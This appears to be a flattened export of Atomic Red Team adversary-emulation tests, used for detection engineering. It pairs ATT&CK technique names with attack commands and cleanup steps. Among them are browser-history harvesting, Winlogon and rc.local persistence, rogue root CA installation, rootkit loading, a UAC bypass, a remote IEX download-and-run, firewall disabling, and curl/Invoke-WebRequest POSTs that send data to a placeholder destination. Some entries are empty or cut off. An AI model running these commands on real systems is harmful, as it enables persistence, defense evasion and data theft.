nodes.description: Searches for Google Chrome's and Opera's Bookmarks file (on Windows distributions) that contains bookmarks. Upon execution, paths that contain bookmark files will be displayed.

nodes.name: Command for List Google Chrome / Opera Bookmarks on Windows with powershell
nodes.description: Get-ChildItem -Path C:\Users\ -Filter Bookmarks -Recurse -ErrorAction SilentlyContinue -Force

nodes.name: List Google Chrome / Edge Chromium Bookmarks on Windows with command prompt
nodes.description: Searches for Google Chromes's and Edge Chromium's Bookmarks file (on Windows distributions) that contains bookmarks. Upon execution, paths that contain bookmark files will be displayed.

nodes.name: Command for List Google Chrome / Edge Chromium Bookmarks on Windows with command prompt

nodes.name: List Mozilla Firefox bookmarks on Windows with command prompt
nodes.description: Searches for Mozilla Firefox bookmarks file (on Windows distributions) that contains bookmarks in a SQLITE database. Upon execution, paths that contain bookmark files will be displayed.

nodes.name: Command for List Mozilla Firefox bookmarks on Windows with command prompt
nodes.description: where /R C:\Users\ places.sqlite

nodes.name: List Internet Explorer Bookmarks using the command prompt
nodes.description: This test will list the bookmarks for Internet Explorer that are found in the Favorites folder

nodes.name: Command for List Internet Explorer Bookmarks using the command prompt
nodes.description: dir /s /b %USERPROFILE%\Favorites

nodes.name: List Safari Bookmarks on MacOS
nodes.description: This test searches for Safari's Bookmarks file (on macOS) and lists any found instances to a text file.

nodes.name: Command for List Safari Bookmarks on MacOS
nodes.description: find / -path "*/Safari/Bookmarks.plist" 2>/dev/null >> #{output_file} cat #{output_file}

nodes.name: Cleanup for List Safari Bookmarks on MacOS

nodes.name: Extract Edge Browsing History
nodes.description: This test will extract Microsoft Edge browser's history of current user

nodes.name: Command for Extract Edge Browsing History
nodes.description: $URL_Regex = '(htt(p|s))://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?' $History = Get-Content -Path "#{history_path}" | Select-String -AllMatches $URL_Regex | ForEach-Object { $_.Matches.Value } | Sort -Unique $History | Out-File -FilePath "#{dest_path}"

nodes.name: Cleanup for Extract Edge Browsing History
nodes.description: Remove-Item -Path "#{dest_path}"

nodes.name: Extract chrome Browsing History
nodes.description: This test will extract browsing history of the chrome user

nodes.name: Command for Extract chrome Browsing History
nodes.description: $Username = (whoami).Split('\')[1] $URL_Regex = '(htt(p|s))://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?' $History = Get-Content -Path "$Env:systemdrive\Users\$UserName\AppData\Local\Google\Chrome\User Data\Default\History" | Select-String -AllMatches $URL_Regex | ForEach-Object { $_.Matches.Value } | Sort -Unique $History | Out-File -FilePath "$Env:USERPROFILE\Downloads\chromebrowsinghistory.txt"

nodes.name: Cleanup for Extract chrome Browsing History
nodes.description: Remove-Item -Path "$Env:USERPROFILE\Downloads\chromebrowsinghistory.txt"

nodes.name: Subvert Trust Controls: SIP and Trust Provider Hijacking
nodes.description: Atomic Red Team technique: Subvert Trust Controls: SIP and Trust Provider Hijacking

nodes.name: SIP (Subject Interface Package) Hijacking via Custom DLL
nodes.description: Registers a DLL that logs signature checks, mimicking SIP hijacking. This test uses a DLL from https://github.com/gtworek/PSBits/tree/master/SIP and registers it using regsvr32, thereby causing the system to utilize it during signature checks, and logging said checks.

nodes.name: Command for SIP (Subject Interface Package) Hijacking via Custom DLL
nodes.description: regsvr32.exe #{dll_payload}

nodes.name: Cleanup for SIP (Subject Interface Package) Hijacking via Custom DLL
nodes.description: regsvr32.exe /u #{dll_payload}

nodes.name: Time Providers
nodes.description: Atomic Red Team technique: Time Providers

nodes.name: Create a new time provider
nodes.description: Establishes persistence by creating a new time provider registry key under HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProvider. The new time provider will point to a DLL which will be loaded after the w32time service is started. The DLL will then create the file AtomicTest.txt in C:\Users\Public\ as validation that the test is successful. Payload source code: https://github.com/tr4cefl0w/payloads/tree/master/T1547.003/

nodes.name: Command for Create a new time provider
nodes.description: net stop w32time Copy-Item "$PathToAtomicsFolder\T1547.003\bin\AtomicTest.dll" C:\Users\Public\AtomicTest.dll reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\AtomicTest" /t REG_SZ /v "DllName" /d "C:\Users\Public\AtomicTest.dll" /f reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\AtomicTest" /t REG_DWORD /v "Enabled" /d "1" /f reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\AtomicTest" /t REG_DWORD /v "InputProvider" /d "1" /f net start w32time

nodes.name: Cleanup for Create a new time provider
nodes.description: net stop w32time reg delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\AtomicTest" /f rm -force C:\Users\Public\AtomicTest.dll net start w32time

nodes.name: Edit an existing time provider
nodes.description: Establishes persistence by editing the NtpServer time provider registry key under HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProvider. The time provider will point to a DLL which will be loaded after the w32time service is started. The DLL will then create the file AtomicTest.txt in C:\Users\Public\ as validation that the test is successful. Payload source code: https://github.com/tr4cefl0w/payloads/tree/master/T1547.003/

nodes.name: Command for Edit an existing time provider
nodes.description: net stop w32time Copy-Item "$PathToAtomicsFolder\T1547.003\bin\AtomicTest.dll" C:\Users\Public\AtomicTest.dll reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer" /t REG_SZ /v "DllName" /d "C:\Users\Public\AtomicTest.dll" /f reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer" /t REG_DWORD /v "Enabled" /d "1" /f reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer" /t REG_DWORD /v "InputProvider" /d "1" /f net start w32time

nodes.name: Cleanup for Edit an existing time provider
nodes.description: net stop w32time reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer" /t REG_SZ /v "DllName" /d "C:\Windows\SYSTEM32\w32time.DLL" /f reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer" /t REG_DWORD /v "Enabled" /d "0" /f reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer" /t REG_DWORD /v "InputProvider" /d "0" /f rm -force C:\Users\Public\AtomicTest.dll net start w32time

nodes.name: Boot or Logon Initialization Scripts: Rc.common
nodes.description: Atomic Red Team technique: Boot or Logon Initialization Scripts: Rc.common

nodes.name: rc.common
nodes.description: Modify rc.common [Reference](https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/StartupItems.html)

nodes.name: Command for rc.common
nodes.description: sudo echo osascript -e 'tell app "Finder" to display dialog "Hello World"' >> /etc/rc.common

nodes.name: rc.common
nodes.description: Modify rc.common

nodes.name: Command for rc.common
nodes.description: filename='/etc/rc.common';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.common.original;fi printf '%s\n' '#!/bin/bash' | sudo tee /etc/rc.common echo "python3 -c \"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMuY29tbW9uID4gL3RtcC9UMTAzNy4wMDQucmMuY29tbW9uJykK'))\"" | sudo tee -a /etc/rc.common printf '%s\n' 'exit 0' | sudo tee -a /etc/rc.common sudo chmod +x /etc/rc.common

nodes.name: Cleanup for rc.common
nodes.description: origfilename='/etc/rc.common.original';if [ ! -f $origfilename ];then sudo rm /etc/rc.common;else sudo cp $origfilename /etc/rc.common && sudo rm $origfilename;fi

nodes.name: rc.local
nodes.description: Modify rc.local

nodes.name: Command for rc.local
nodes.description: filename='/etc/rc.local';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.local.original;fi [ "$(uname)" = 'FreeBSD' ] && alias python3=python3.9 && printf '#\!/usr/local/bin/bash' | sudo tee /etc/rc.local || printf '#!/bin/bash' | sudo tee /etc/rc.local echo "\npython3 -c \"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMubG9jYWwgPiAvdG1wL1QxMDM3LjAwNC5yYy5sb2NhbCcpCgo='))\"" | sudo tee -a /etc/rc.local printf 'exit 0' | sudo tee -a /etc/rc.local sudo chmod +x /etc/rc.local

nodes.name: Cleanup for rc.local
nodes.description: origfilename='/etc/rc.local.original';if [ ! -f $origfilename ];then sudo rm /etc/rc.local;else sudo cp $origfilename /etc/rc.local && sudo rm $origfilename;fi

nodes.name: Boot or Logon Autostart Execution: Winlogon Helper DLL
nodes.description: Atomic Red Team technique: Boot or Logon Autostart Execution: Winlogon Helper DLL

nodes.name: Winlogon Shell Key Persistence - PowerShell
nodes.description: PowerShell code to set Winlogon shell key to execute a binary at logon along with explorer.exe. Upon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.

nodes.name: Command for Winlogon Shell Key Persistence - PowerShell
nodes.description: Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, #{binary_to_execute}" -Force

nodes.name: Cleanup for Winlogon Shell Key Persistence - PowerShell
nodes.description: Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" -Name "Shell" -Force -ErrorAction Ignore

nodes.name: Winlogon Userinit Key Persistence - PowerShell
nodes.description: PowerShell code to set Winlogon userinit key to execute a binary at logon along with userinit.exe. Upon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.

nodes.name: Command for Winlogon Userinit Key Persistence - PowerShell
nodes.description: Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "Userinit.exe, #{binary_to_execute}" -Force

nodes.name: Cleanup for Winlogon Userinit Key Persistence - PowerShell
nodes.description: Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" -Name "Userinit" -Force -ErrorAction Ignore

nodes.name: Winlogon Notify Key Logon Persistence - PowerShell
nodes.description: PowerShell code to set Winlogon Notify key to execute a notification package DLL at logon. Upon successful execution, PowerShell will modify a registry value to execute atomicNotificationPackage.dll upon logon. Please note that Winlogon Notifications have been removed as of Windows Vista / Windows Server 2008 and that this test thus only applies to erlier versions of Windows.

nodes.name: Command for Winlogon Notify Key Logon Persistence - PowerShell
nodes.description: New-Item "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam" -Force Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam" "DllName" "#{binary_to_execute}" -Type ExpandString -Force Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam" "Logon" "#{function_to_execute}" -Force Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam" "Impersonate" 1 -Type DWord -Force Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam" "Asynchronous" 0 -Type DWord -Force

nodes.name: Cleanup for Winlogon Notify Key Logon Persistence - PowerShell
nodes.description: Remove-Item "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify" -Force -ErrorAction Ignore

nodes.name: Winlogon HKLM Shell Key Persistence - PowerShell
nodes.description: PowerShell code to set Winlogon shell key to execute a binary at logon along with explorer.exe. Upon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.

nodes.name: Command for Winlogon HKLM Shell Key Persistence - PowerShell
nodes.description: Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, #{binary_to_execute}" -Force

nodes.name: Cleanup for Winlogon HKLM Shell Key Persistence - PowerShell
nodes.description: Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" -Name "Shell" -Force -ErrorAction Ignore

nodes.name: Winlogon HKLM Userinit Key Persistence - PowerShell
nodes.description: PowerShell code to set Winlogon userinit key to execute a binary at logon along with userinit.exe. Upon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.

nodes.name: Command for Winlogon HKLM Userinit Key Persistence - PowerShell
nodes.description: Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "Userinit.exe, #{binary_to_execute}" -Force

nodes.name: Cleanup for Winlogon HKLM Userinit Key Persistence - PowerShell
nodes.description: Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" -Name "Userinit" -Force -ErrorAction Ignore

nodes.name: Subvert Trust Controls: Install Root Certificate
nodes.description: Atomic Red Team technique: Subvert Trust Controls: Install Root Certificate

nodes.name: Install root CA on CentOS/RHEL
nodes.description: Creates a root CA with openssl

nodes.name: Command for Install root CA on CentOS/RHEL
nodes.description: openssl genrsa -out #{key_filename} 4096 openssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj "/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com" -out #{cert_filename} cp #{cert_filename} /etc/pki/ca-trust/source/anchors/ update-ca-trust

nodes.name: Cleanup for Install root CA on CentOS/RHEL
nodes.description: rm /etc/pki/ca-trust/source/anchors/#{cert_filename} update-ca-trust

nodes.name: Install root CA on FreeBSD
nodes.description: Creates a root CA with openssl

nodes.name: Command for Install root CA on FreeBSD
nodes.description: openssl genrsa -out #{key_filename} 4096 openssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj "/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com" -out #{cert_filename} cp #{cert_filename} /usr/local/share/certs/ certctl rehash

nodes.name: Cleanup for Install root CA on FreeBSD
nodes.description: rm /usr/local/share/certs/#{cert_filename} certctl rehash

nodes.name: Install root CA on Debian/Ubuntu
nodes.description: Creates a root CA with openssl

nodes.name: Command for Install root CA on Debian/Ubuntu
nodes.description: mv #{cert_filename} /usr/local/share/ca-certificates sudo update-ca-certificates

nodes.name: Install root CA on macOS
nodes.description: Creates a root CA with openssl

nodes.name: Command for Install root CA on macOS
nodes.description: sudo security add-trusted-cert -d -r trustRoot -k "/Library/Keychains/System.keychain" "#{cert_filename}"

nodes.name: Install root CA on Windows
nodes.description: Creates a root CA with Powershell

nodes.name: Command for Install root CA on Windows
nodes.description: $cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\LocalMachine\My Move-Item -Path $cert.PSPath -Destination "Cert:\LocalMachine\Root"

nodes.name: Cleanup for Install root CA on Windows
nodes.description: try { $cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\LocalMachine\My -ErrorAction Ignore Get-ChildItem Cert:\LocalMachine\My\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore Get-ChildItem Cert:\LocalMachine\Root\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore } catch { }

nodes.name: Install root CA on Windows with certutil
nodes.description: Creates a root CA with certutil

nodes.name: Command for Install root CA on Windows with certutil
nodes.description: certutil -addstore my #{pfx_path}

nodes.name: Cleanup for Install root CA on Windows with certutil
nodes.description: try { $cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\LocalMachine\My Get-ChildItem Cert:\LocalMachine\My\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore Get-ChildItem Cert:\LocalMachine\Root\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore } catch { }

nodes.name: Add Root Certificate to CurrentUser Certificate Store
nodes.description: The following Atomic test simulates adding a generic non-malicious certificate to the CurrentUser certificate store. This behavior generates a registry modification that adds the cloned root CA certificate in the keys outlined in the blog. Keys will look like - \SystemCertificates\CA\Certificates or \SystemCertificates\Root\Certificates Reference: https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec

nodes.name: Command for Add Root Certificate to CurrentUser Certificate Store
nodes.description: IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing)

nodes.name: Cleanup for Add Root Certificate to CurrentUser Certificate Store
nodes.description: Get-ChildItem -Path Cert:\ -Recurse | Where-Object { $_.Thumbprint -eq '1F3D38F280635F275BE92B87CF83E40E40458400' } | remove-item

nodes.name: Rootkit
nodes.description: Atomic Red Team technique: Rootkit

nodes.name: Loadable Kernel Module based Rootkit
nodes.description: Loadable Kernel Module based Rootkit

nodes.name: Command for Loadable Kernel Module based Rootkit
nodes.description: sudo insmod #{rootkit_path}/#{rootkit_name}.ko

nodes.name: Cleanup for Loadable Kernel Module based Rootkit
nodes.description: sudo rmmod #{rootkit_name} sudo rm -rf #{rootkit_path}

nodes.name: Loadable Kernel Module based Rootkit
nodes.description: Loadable Kernel Module based Rootkit

nodes.name: Command for Loadable Kernel Module based Rootkit
nodes.description: sudo modprobe #{rootkit_name}

nodes.name: Cleanup for Loadable Kernel Module based Rootkit
nodes.description: sudo modprobe -r #{rootkit_name} sudo rm /lib/modules/$(uname -r)/#{rootkit_name}.ko sudo depmod -a

nodes.name: dynamic-linker based rootkit (libprocesshider)
nodes.description: Uses libprocesshider to simulate rootkit behavior by hiding a specific process name via ld.so.preload (see also T1574.006).

nodes.name: Command for dynamic-linker based rootkit (libprocesshider)
nodes.description: echo #{library_path} | tee -a /etc/ld.so.preload /usr/local/bin/evil_script.py localhost -c 10 >/dev/null & pgrep -l evil_script.py || echo "process hidden"

nodes.name: Cleanup for dynamic-linker based rootkit (libprocesshider)
nodes.description: sed -i "\:^#{library_path}:d" /etc/ld.so.preload rm -rf #{library_path} /usr/local/bin/evil_script.py /tmp/atomic

nodes.name: Loadable Kernel Module based Rootkit (Diamorphine)
nodes.description: Loads Diamorphine kernel module, which hides itself and a processes.

nodes.name: Command for Loadable Kernel Module based Rootkit (Diamorphine)
nodes.description: sudo modprobe #{rootkit_name} ping -c 10 localhost >/dev/null & TARGETPID="$!" ps $TARGETPID kill -31 $TARGETPID ps $TARGETPID || echo "process ${TARGETPID} hidden"

nodes.name: Cleanup for Loadable Kernel Module based Rootkit (Diamorphine)
nodes.description: kill -63 1 sudo modprobe -r #{rootkit_name} sudo rm -rf /lib/modules/$(uname -r)/#{rootkit_name}.ko /tmp/atomic sudo depmod -a

nodes.name: Remote Access Software
nodes.description: Atomic Red Team technique: Remote Access Software

nodes.name: TeamViewer Files Detected Test on Windows
nodes.description: An adversary may attempt to trick the user into downloading teamviewer and using this to maintain access to the machine. Download of TeamViewer installer will be at the destination location when sucessfully executed.

nodes.name: Command for TeamViewer Files Detected Test on Windows
nodes.description: Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\TeamViewer_Setup.exe https://download.teamviewer.com/download/TeamViewer_Setup.exe $file1 = "C:\Users\" + $env:username + "\Desktop\TeamViewer_Setup.exe" Start-Process -Wait $file1 /S; Start-Process 'C:\Program Files (x86)\TeamViewer\TeamViewer.exe'

nodes.name: Cleanup for TeamViewer Files Detected Test on Windows
nodes.description: $file = 'C:\Program Files (x86)\TeamViewer\uninstall.exe' if(Test-Path $file){ Start-Process $file "/S" -ErrorAction Ignore | Out-Null } $file1 = "C:\Users\" + $env:username + "\Desktop\TeamViewer_Setup.exe" Remove-Item $file1 -ErrorAction Ignore | Out-Null

nodes.name: AnyDesk Files Detected Test on Windows
nodes.description: An adversary may attempt to trick the user into downloading AnyDesk and use to establish C2. Download of AnyDesk installer will be at the destination location and ran when sucessfully executed.

nodes.name: Command for AnyDesk Files Detected Test on Windows
nodes.description: Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\AnyDesk.exe https://download.anydesk.com/AnyDesk.exe $file1 = "C:\Users\" + $env:username + "\Desktop\AnyDesk.exe" Start-Process $file1 /S;

nodes.name: Cleanup for AnyDesk Files Detected Test on Windows
nodes.description: $file1 = "C:\Users\" + $env:username + "\Desktop\AnyDesk.exe" Remove-Item $file1 -ErrorAction Ignore

nodes.name: LogMeIn Files Detected Test on Windows
nodes.description: An adversary may attempt to trick the user into downloading LogMeIn and use to establish C2. Download of LogMeIn installer will be at the destination location and ran when sucessfully executed.

nodes.name: Command for LogMeIn Files Detected Test on Windows
nodes.description: Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\LogMeInIgnition.msi https://secure.logmein.com/LogMeInIgnition.msi $file1 = "C:\Users\" + $env:username + "\Desktop\LogMeInIgnition.msi" Start-Process -Wait $file1 /quiet; Start-Process 'C:\Program Files (x86)\LogMeIn Ignition\LMIIgnition.exe' "/S"

nodes.name: Cleanup for LogMeIn Files Detected Test on Windows
nodes.description: get-package *'LogMeIn Client'* -ErrorAction Ignore | uninstall-package $file1 = "C:\Users\" + $env:username + "\Desktop\LogMeInIgnition.msi" Remove-Item $file1 -ErrorAction Ignore

nodes.name: GoToAssist Files Detected Test on Windows

nodes.name: Hijack Execution Flow: COR_PROFILER
nodes.description: Atomic Red Team technique: Hijack Execution Flow: COR_PROFILER

nodes.name: User scope COR_PROFILER
nodes.description: Creates user scope environment variables and CLSID COM object to enable a .NET profiler (COR_PROFILER). The unmanaged profiler DLL (`T1574.012x64.dll`) executes when the CLR is loaded by the Event Viewer process. Additionally, the profiling DLL will inherit the integrity level of Event Viewer bypassing UAC and executing `notepad.exe` with high integrity. If the account used is not a local administrator the profiler DLL will still execute each time the CLR is loaded by a process, however, the notepad process will not execute with high integrity. Reference: https://redcanary.com/blog/cor_profiler-for-persistence/

nodes.name: Command for User scope COR_PROFILER
nodes.description: Write-Host "Creating registry keys in HKCU:Software\Classes\CLSID\#{clsid_guid}" -ForegroundColor Cyan New-Item -Path "HKCU:\Software\Classes\CLSID\#{clsid_guid}\InprocServer32" -Value "#{file_name}" -Force | Out-Null New-ItemProperty -Path HKCU:\Environment -Name "COR_ENABLE_PROFILING" -PropertyType String -Value "1" -Force | Out-Null New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER" -PropertyType String -Value "#{clsid_guid}" -Force | Out-Null New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER_PATH" -PropertyType String -Value "#{file_name}" -Force | Out-Null Write-Host "executing eventvwr.msc" -ForegroundColor Cyan START MMC.EXE EVENTVWR.MSC

nodes.name: Cleanup for User scope COR_PROFILER
nodes.description: Remove-Item -Path "HKCU:\Software\Classes\CLSID\#{clsid_guid}" -Recurse -Force -ErrorAction Ignore Remove-ItemProperty -Path HKCU:\Environment -Name "COR_ENABLE_PROFILING" -Force -ErrorAction Ignore | Out-Null Remove-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER" -Force -ErrorAction Ignore | Out-Null Remove-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER_PATH" -Force -ErrorAction Ignore | Out-Null

nodes.name: System Scope COR_PROFILER
nodes.description: Creates system scope environment variables to enable a .NET profiler (COR_PROFILER). System scope environment variables require a restart to take effect. The unmanaged profiler DLL (T1574.012x64.dll`) executes when the CLR is loaded by any process. Additionally, the profiling DLL will inherit the integrity level of Event Viewer bypassing UAC and executing `notepad.exe` with high integrity. If the account used is not a local administrator the profiler DLL will still execute each time the CLR is loaded by a process, however, the notepad process will not execute with high integrity. Reference: https://redcanary.com/blog/cor_profiler-for-persistence/

nodes.name: Command for System Scope COR_PROFILER
nodes.description: Write-Host "Creating system environment variables" -ForegroundColor Cyan New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_ENABLE_PROFILING" -PropertyType String -Value "1" -Force | Out-Null New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER" -PropertyType String -Value "#{clsid_guid}" -Force | Out-Null New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER_PATH" -PropertyType String -Value "#{file_name}" -Force | Out-Null

nodes.name: Cleanup for System Scope COR_PROFILER
nodes.description: Remove-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_ENABLE_PROFILING" -Force -ErrorAction Ignore | Out-Null Remove-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER" -Force -ErrorAction Ignore | Out-Null Remove-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER_PATH" -Force -ErrorAction Ignore | Out-Null

nodes.name: Registry-free process scope COR_PROFILER
nodes.description: Creates process scope environment variables to enable a .NET profiler (COR_PROFILER) without making changes to the registry. The unmanaged profiler DLL (`T1574.012x64.dll`) executes when the CLR is loaded by PowerShell. Reference: https://redcanary.com/blog/cor_profiler-for-persistence/

nodes.name: Command for Registry-free process scope COR_PROFILER
nodes.description: $env:COR_ENABLE_PROFILING = 1 $env:COR_PROFILER = '#{clsid_guid}' $env:COR_PROFILER_PATH = '"#{file_name}"' POWERSHELL -c 'Start-Sleep 1'

nodes.name: Cleanup for Registry-free process scope COR_PROFILER
nodes.description: $env:COR_ENABLE_PROFILING = 0 $env:COR_PROFILER = '' $env:COR_PROFILER_PATH = ''

nodes.description: Utilizing a common technique for posting base64 encoded data.

nodes.name: Command for Base64 Encoded data.
nodes.description: echo -n 111-11-1111 | base64 curl -XPOST #{base64_data}.#{destination_url}

nodes.name: Base64 Encoded data (freebsd)
nodes.description: Utilizing a common technique for posting base64 encoded data.

nodes.name: Command for Base64 Encoded data (freebsd)
nodes.description: echo -n 111-11-1111 | b64encode -r - curl -XPOST #{base64_data}.#{destination_url}

nodes.name: XOR Encoded data.
nodes.description: XOR encodes the data with a XOR key. Reference - https://gist.github.com/loadenmb/8254cee0f0287b896a05dcdc8a30042f

nodes.name: Command for XOR Encoded data.
nodes.description: $plaintext = ([system.Text.Encoding]::UTF8.getBytes("#{plaintext}")) $key = "#{key}" $cyphertext = @(); for ($i = 0; $i -lt $plaintext.Count; $i++) { $cyphertext += $plaintext[$i] -bxor $key[$i % $key.Length]; } $cyphertext = [system.Text.Encoding]::UTF8.getString($cyphertext) [System.Net.ServicePointManager]::Expect100Continue = $false Invoke-WebRequest -Uri #{destination_url} -Method POST -Body $cyphertext -DisableKeepAlive

nodes.name: Impair Defenses: Disable or Modify System Firewall
nodes.description: Atomic Red Team technique: Impair Defenses: Disable or Modify System Firewall

nodes.name: Disable Microsoft Defender Firewall
nodes.description: Disables the Microsoft Defender Firewall for the current profile. Caution if you access remotely the host where the test runs! Especially with the cleanup command which will re-enable firewall for the current profile...

nodes.name: Command for Disable Microsoft Defender Firewall
nodes.description: netsh advfirewall set currentprofile state off

nodes.name: Cleanup for Disable Microsoft Defender Firewall
nodes.description: netsh advfirewall set currentprofile state on >nul 2>&1

nodes.name: Disable Microsoft Defender Firewall via Registry
nodes.description: Disables the Microsoft Defender Firewall for the public profile via registry Caution if you access remotely the host where the test runs! Especially with the cleanup command which will re-enable firewall for the current profile...

nodes.name: Command for Disable Microsoft Defender Firewall via Registry
nodes.description: reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\PublicProfile" /v "EnableFirewall" /t REG_DWORD /d 0 /f

nodes.name: Cleanup for Disable Microsoft Defender Firewall via Registry
nodes.description: reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\PublicProfile" /v "EnableFirewall" /t REG_DWORD /d 1 /f

nodes.name: Allow SMB and RDP on Microsoft Defender Firewall
nodes.description: Allow all SMB and RDP rules on the Microsoft Defender Firewall for all profiles. Caution if you access remotely the host where the test runs! Especially with the cleanup command which will reset the firewall and risk disabling those services...

nodes.name: Command for Allow SMB and RDP on Microsoft Defender Firewall
nodes.description: netsh advfirewall firewall set rule group="remote desktop" new enable=Yes netsh advfirewall firewall set rule group="file and printer sharing" new enable=Yes

nodes.name: Cleanup for Allow SMB and RDP on Microsoft Defender Firewall
nodes.description: netsh advfirewall reset >nul 2>&1

nodes.name: Opening ports for proxy - HARDRAIN
nodes.description: This test creates a listening interface on a victim device. This tactic was used by HARDRAIN for proxying. reference: https://www.us-cert.gov/sites/default/files/publications/MAR-10135536-F.pdf

nodes.name: Command for Opening ports for proxy - HARDRAIN
nodes.description: netsh advfirewall firewall add rule name="atomic testing" action=allow dir=in protocol=TCP localport=450

nodes.name: Cleanup for Opening ports for proxy - HARDRAIN
nodes.description: netsh advfirewall firewall delete rule name="atomic testing" protocol=TCP localport=450 >nul 2>&1

nodes.name: Open a local port through Windows Firewall to any profile
nodes.description: This test will attempt to open a local port defined by input arguments to any profile

nodes.name: Command for Open a local port through Windows Firewall to any profile
nodes.description: netsh advfirewall firewall add rule name="Open Port to Any" dir=in protocol=tcp localport=#{local_port} action=allow profile=any

nodes.name: Cleanup for Open a local port through Windows Firewall to any profile
nodes.description: netsh advfirewall firewall delete rule name="Open Port to Any" | Out-Null

nodes.name: Allow Executable Through Firewall Located in Non-Standard Location
nodes.description: This test will attempt to allow an executable through the system firewall located in the Users directory

nodes.name: Command for Allow Executable Through Firewall Located in Non-Standard Location
